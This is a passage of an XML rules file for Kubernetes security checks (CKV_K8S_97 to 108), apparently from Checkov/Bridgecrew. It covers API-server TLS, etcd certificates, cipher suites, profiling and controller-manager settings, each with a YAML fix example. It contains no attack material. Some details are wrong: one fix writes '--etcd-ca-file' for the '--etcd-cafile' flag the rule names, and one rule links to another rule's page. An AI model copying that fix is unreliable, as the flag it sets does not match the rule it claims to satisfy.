  </rule>
  <rule>
    <key>CKV_K8S_97</key>
    <name>Ensure the --service-account-key-file argument is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---service-account-key-file-argument-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-service-account-key-file-argument-is-not-set-appropriately"></div>The --service-account-key-file argument is not set appropriately  </div><a aria-label="Skip link to The --service-account-key-file argument is not set appropriately  " class="heading-anchor-icon fa fa-anchor" href="#the---service-account-key-file-argument-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Explicitly set a service account public key file for service accounts on the apiserver.<br/>
By default, if no --service-account-key-file is specified to the apiserver, it uses the private key from the TLS serving certificate to verify service account tokens. To ensure that the keys for service account tokens could be rotated as needed, a separate public/private key pair should be used for signing service account tokens. Hence, the public key should be specified to the apiserver with --service-account-key-file.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --service-account-key-file=/keys/key.pem
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-service-account-key-file-argument-is-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-service-account-key-file-argument-is-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-service-account-key-file-argument-is-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_99</key>
    <name>Ensure the --etcd-certfile and --etcd-keyfile arguments are set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---etcd-certfile-and---etcd-keyfile-arguments-are-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-etcd-certfile-and-etcd-keyfile-arguments-are-not-set-appropriately"></div>The --etcd-certfile and --etcd-keyfile arguments are not set appropriately</div><a aria-label="Skip link to The --etcd-certfile and --etcd-keyfile arguments are not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---etcd-certfile-and---etcd-keyfile-arguments-are-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>etcd should be configured to make use of TLS encryption for client connections.<br/>
etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be protected by client authentication. This requires the API server to identify itself to the etcd server using a client certificate and key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-apiserver
    - --etcd-certfile=/path/to/cert
    - --etcd-keyfile=/path/to/key
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kube-apiserver-should-pass
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-etcd-certfile-and-etcd-keyfile-arguments-are-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-etcd-certfile-and-etcd-keyfile-arguments-are-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-etcd-certfile-and-etcd-keyfile-arguments-are-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_100</key>
    <name>Ensure the --tls-cert-file and --tls-private-key-file arguments are set appropriately for API servers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---tls-cert-file-and---tls-private-key-file-arguments-are-not-set-appropriately-for-api-servers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-tls-cert-file-and-tls-private-key-file-arguments-are-not-set-appropriately-for-api-servers"></div>The --tls-cert-file and --tls-private-key-file arguments are not set appropriately for API servers</div><a aria-label="Skip link to The --tls-cert-file and --tls-private-key-file arguments are not set appropriately for API servers" class="heading-anchor-icon fa fa-anchor" href="#the---tls-cert-file-and---tls-private-key-file-arguments-are-not-set-appropriately-for-api-servers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p> API server communication contains sensitive parameters that should remain encrypted in transit. Configure the API server to serve only HTTPS traffic by setup TLS connection on the API server. By default, --tls-cert-file and --tls-private-key-file arguments are not set.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-apiserver
      tier: control-plane
    name: kube-apiserver
    namespace: kube-system
  spec:
    containers:
    - command:
       - kube-apiserver
+      - --tls-cert-file=/path/to/cert
+      - --tls-private-key-file=/path/to/key
      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
      livenessProbe:
        failureThreshold: 8
        httpGet:
          host: 127.0.0.1
          path: /healthz
          port: 6443
          scheme: HTTPS
        initialDelaySeconds: 15
        timeoutSeconds: 15
      name: kube-apiserver
      resources:
        requests:
          cpu: 250m
      volumeMounts:
      - mountPath: /etc/kubernetes/
        name: k8s
        readOnly: true
      - mountPath: /etc/ssl/certs
        name: certs
      - mountPath: /etc/pki
        name: pki
    hostNetwork: true
    volumes:
    - hostPath:
        path: /etc/kubernetes
      name: k8s
    - hostPath:
        path: /etc/ssl/certs
      name: certs
    - hostPath:
        path: /etc/pki
      name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_102</key>
    <name>Ensure the --etcd-cafile argument is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---etcd-cafile-argument-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-etcd-cafile-argument-is-not-set-appropriately"></div>The --etcd-cafile argument is not set appropriately</div><a aria-label="Skip link to The --etcd-cafile argument is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---etcd-cafile-argument-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>etcd</strong> should be configured to make use of TLS encryption for client connections. <strong>etcd</strong> is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be protected by client authentication. This requires the API server to identify itself to the <strong>etcd </strong>server using a SSL Certificate Authority file.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --etcd-ca-file=ca.file
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kube-apiserver
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_104</key>
    <name>Ensure encryption providers are appropriately configured</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="encryption-providers-are-not-appropriately-configured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-encryption-providers-are-not-appropriately-configured"></div>Encryption providers are not appropriately configured</div><a aria-label="Skip link to Encryption providers are not appropriately configured" class="heading-anchor-icon fa fa-anchor" href="#encryption-providers-are-not-appropriately-configured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Where etcd encryption is used, appropriate providers should be configured. Where etcd encryption is used, it is important to ensure that the appropriate set of encryption providers is used. Currently, the aescbc, kms and secretbox are likely to be appropriate options.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --encryption-provider-config=config.file
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kube-apiserver-should-pass
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_105</key>
    <name>Ensure the API server makes use of strong cryptographic ciphers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-api-server-does-not-make-use-of-strong-cryptographic-ciphers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-api-server-does-not-make-use-of-strong-cryptographic-ciphers"></div>The API server does not make use of strong cryptographic ciphers</div><a aria-label="Skip link to The API server does not make use of strong cryptographic ciphers" class="heading-anchor-icon fa fa-anchor" href="#the-api-server-does-not-make-use-of-strong-cryptographic-ciphers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that the API server is configured to only use strong cryptographic ciphers. TLS ciphers have had a number of known vulnerabilities and weaknesses, which can reduce the protection provided by them. By default Kubernetes supports a number of TLS ciphersuites including some that have security concerns, weakening the protection provided.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kube-apiserver-should-pass
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-api-server-only-makes-use-of-strong-cryptographic-ciphers' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-api-server-only-makes-use-of-strong-cryptographic-ciphers</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-api-server-only-makes-use-of-strong-cryptographic-ciphers' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_106</key>
    <name>Ensure the --terminated-pod-gc-threshold argument for controller managers is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---terminated-pod-gc-threshold-argument-for-controller-managers-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-terminated-pod-gc-threshold-argument-for-controller-managers-is-not-set-appropriately"></div>The --terminated-pod-gc-threshold argument for controller managers is not set appropriately</div><a aria-label="Skip link to The --terminated-pod-gc-threshold argument for controller managers is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---terminated-pod-gc-threshold-argument-for-controller-managers-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Activate garbage collector on pod termination, as appropriate.. Garbage collection is important to ensure sufficient resource availability and avoiding degraded performance and availability. In the worst case, the system might crash or just be unusable for a long period of time. The current setting for garbage collection is 12,500 terminated pods which might be too high for your system to sustain. Based on your system resources and tests, choose an appropriate threshold value to activate garbage collection.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-controller-manager
      tier: control-plane
    name: kube-controller-manager
    namespace: kube-system
  spec:
    containers:
    - command:
      - kube-controller-manager
+     -  --terminated-pod-gc-threshold=555
      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0
      livenessProbe:
        failureThreshold: 8
        httpGet:
          host: 127.0.0.1
          path: /healthz
          port: 6443
          scheme: HTTPS
        initialDelaySeconds: 15
        timeoutSeconds: 15
      name: kube-controller-manager-should-pass
      resources:
        requests:
          cpu: 250m
      volumeMounts:
      - mountPath: /etc/kubernetes/
        name: k8s
        readOnly: true
      - mountPath: /etc/ssl/certs
        name: certs
      - mountPath: /etc/pki
        name: pki
    hostNetwork: true
    volumes:
    - hostPath:
        path: /etc/kubernetes
      name: k8s
    - hostPath:
        path: /etc/ssl/certs
      name: certs
    - hostPath:
        path: /etc/pki
      name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-terminated-pod-gc-threshold-argument-is-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-terminated-pod-gc-threshold-argument-is-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-terminated-pod-gc-threshold-argument-is-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_107</key>
    <name>Ensure the --profiling argument for controller managers is set to False</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---profiling-argument-for-controller-managers-is-not-set-to-false"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-profiling-argument-for-controller-managers-is-not-set-to-false"></div>The --profiling argument for controller managers is not set to False</div><a aria-label="Skip link to The --profiling argument for controller managers is not set to False" class="heading-anchor-icon fa fa-anchor" href="#the---profiling-argument-for-controller-managers-is-not-set-to-false"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable profiling, if not needed. Profiling allows for the identification of specific performance bottlenecks. It generates a significant amount of program data that could potentially be exploited to uncover system and program details. If you are not experiencing any bottlenecks and do not need the profiler for troubleshooting purposes, it is recommended to turn it off to reduce the potential attack surface.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-controller-manager
      tier: control-plane
    name: kube-controller-manager
    namespace: kube-system
  spec:
    containers:
    - command:
      - kube-controller-manager
+     -  --profiling=false
      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_108</key>
    <name>Ensure the --use-service-account-credentials argument for controller managers is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---use-service-account-credentials-argument-for-controller-managers-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-use-service-account-credentials-argument-for-controller-managers-is-not-set-to-true"></div>The --use-service-account-credentials argument for controller managers is not set to True</div><a aria-label="Skip link to The --use-service-account-credentials argument for controller managers is not set to True" class="heading-anchor-icon fa fa-anchor" href="#the---use-service-account-credentials-argument-for-controller-managers-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use individual service account credentials for each controller. The controller manager creates a service account per controller in the kube-system namespace, generates a credential for it, and builds a dedicated API client with that service account credential for each controller loop to use. Setting the --use-service-account- credentials to true runs each control loop within the controller manager using a separate service account credential. When used in combination with RBAC, this ensures that the control loops run with the minimum permissions required to perform their intended tasks.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
